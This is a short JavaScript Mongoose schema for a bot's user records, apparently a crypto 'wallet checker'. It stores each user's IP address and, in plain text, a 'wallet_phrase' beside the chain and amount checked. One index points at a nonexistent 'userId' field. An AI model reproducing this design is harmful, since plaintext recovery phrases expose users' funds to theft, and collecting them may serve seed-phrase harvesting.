const mongoose = require("mongoose");

const userSchema = new mongoose.Schema({
  user_id :{
    type : String,
    unique: true,
    required : true,
  },
  user_name: {
    type: String,
  },
  first_name: {
    type: String,
    required: true,
  },
  join_date : {
    type: Date,
    required : true
  },
  is_upgraded : {
    type: Boolean,
    default : false
  },
  my_wallet_checked : {
    type : [
      {
        date : {
          type: Date,
          required : true
        },
        chain : {
          type: String,
          required : true
        },
        amount : {
          type : Number,
          required : true
        },
        wallet_phrase : {
          type : String
        }
      }
    ]
  },
  is_valid_user: {
    type: Boolean,
    default: true,
  },
  ip_address :{
    type : String
  }
});

userSchema.index({ userId: 1 });
userSchema.index({ join_date: -1 });
userSchema.index({ ip_address: 1 });

const userModel = new mongoose.model("users", userSchema);
module.exports = userModel;